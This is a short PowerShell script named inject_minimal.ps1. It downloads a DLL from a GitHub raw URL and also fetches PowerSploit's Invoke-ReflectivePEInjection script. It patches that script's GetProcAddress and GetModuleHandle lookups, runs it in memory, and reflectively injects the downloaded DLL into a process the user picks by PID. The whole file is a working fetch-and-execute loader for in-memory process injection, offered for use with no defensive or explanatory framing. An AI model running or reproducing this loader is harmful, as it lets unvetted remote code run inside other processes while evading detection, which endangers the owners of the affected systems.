# inject_minimal.ps1 - สั้นที่สุด

$dllUrl = "https://raw.githubusercontent.com/newgen319/xxx_x1/refs/heads/main/xxx_x1_x64.dll"
$dllBytes = (iwr -UseBasicParsing $dllUrl).Content
$ps1 = (iwr -UseBasicParsing "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1").Content
$ps1 = $ps1 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
$ps1 = $ps1 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
. ([ScriptBlock]::Create($ps1))

Get-Process | Select Id, ProcessName | Format-Table -AutoSize
$p = Read-Host "PID"
Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId $p
